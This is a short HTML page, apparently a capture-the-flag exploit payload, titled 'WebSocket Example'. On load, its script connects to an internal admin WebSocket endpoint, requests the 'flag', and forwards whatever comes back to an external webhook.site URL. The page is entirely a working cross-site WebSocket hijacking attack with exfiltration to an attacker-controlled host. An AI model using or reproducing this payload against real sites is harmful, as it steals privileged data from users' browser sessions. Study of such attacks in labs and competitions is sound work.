<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Example</title>
</head>
<body>
    <script>
        const socket = new WebSocket('ws://web:8080/admin/ws');
        socket.onopen = () => { 
            socket.send('flag');
        };
        socket.onmessage = (message) => {
            fetch(`https://webhook.site/3d6fec3f-a86f-4ada-911f-5db410f9159d?flag=${message.data}`);
        };
    </script>
</body>
</html>
